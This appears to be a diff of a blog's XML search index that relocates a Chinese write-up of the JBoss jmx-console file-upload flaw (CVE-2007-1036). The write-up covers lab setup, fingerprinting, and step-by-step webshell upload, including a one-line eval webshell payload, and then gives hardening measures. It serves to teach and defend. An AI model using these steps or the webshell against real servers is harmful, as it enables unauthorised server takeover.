+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
+<ol>
+<li>JBoss漏洞检测工具下载</li>
+</ol>
+<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
+<ol start="2">
+<li>先探测是否具有JBoss服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据HTTP头部</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>访问如下URL</strong></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2b2e3akxj60m00b9aej02.jpg" alt="JBoss文件上传store().png"></p>
+<p>在P1输入上传的war包，如<code>shell.war</code></p>
+<p>在P2输入上传的文件名，如<code>shell</code></p>
+<p>在P3输入上传的文件格式，如<code>.jsp</code></p>
+<p>在P4输入上传的文件内容，如一句话<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code></p>
+<p>最后点击<code>Invoke</code>上传</p>
+<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
+<p>访问以下URL链接shell</p>
+<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
+<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>常规漏洞</category>
+        <category>文件上传漏洞</category>
+        <category>JBoss</category>
+      </categories>
+      <tags>
+        <tag>访问控制错误漏洞</tag>
+        <tag>文件上传漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -6251,87 +6369,6 @@
       </categories>
       <tags>
         <tag>反序列化漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JBoss后台文件上传漏洞 - CVE-2007-1036</title>
-    <url>//013bc4e5df03.html</url>
-    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<p>默认端口：8080</p>
-<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
-<p>全版本</p>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
-<p>在官网下载相应的JBoss版本</p>
-<p>配置环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
-
-<p>外网访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
-<ol>
-<li>JBoss漏洞检测工具下载</li>
-</ol>
-<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
-<ol start="2">
-<li>先探测是否具有JBoss服务</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
-
-<p>根据HTTP头部</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>访问如下URL</strong></p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2b2e3akxj60m00b9aej02.jpg" alt="JBoss文件上传store().png"></p>
-<p>在P1输入上传的war包，如<code>shell.war</code></p>
-<p>在P2输入上传的文件名，如<code>shell</code></p>
-<p>在P3输入上传的文件格式，如<code>.jsp</code></p>
-<p>在P4输入上传的文件内容，如一句话<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code></p>
-<p>最后点击<code>Invoke</code>上传</p>
-<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
-<p>访问以下URL链接shell</p>
-<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
-<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web服务器漏洞</category>
-        <category>常规漏洞</category>
-        <category>文件上传漏洞</category>
-        <category>JBoss</category>
-      </categories>
-      <tags>
-        <tag>访问控制错误漏洞</tag>
-        <tag>文件上传漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -9774,8 +9811,8 @@
       <categories>
         <category>漏洞利用</category>
         <category>常规漏洞</category>
-        <category>操作系统漏洞</category>
         <category>远程代码执行漏洞</category>
+        <category>操作系统漏洞</category>
         <category>Windows</category>
       </categories>
       <tags>
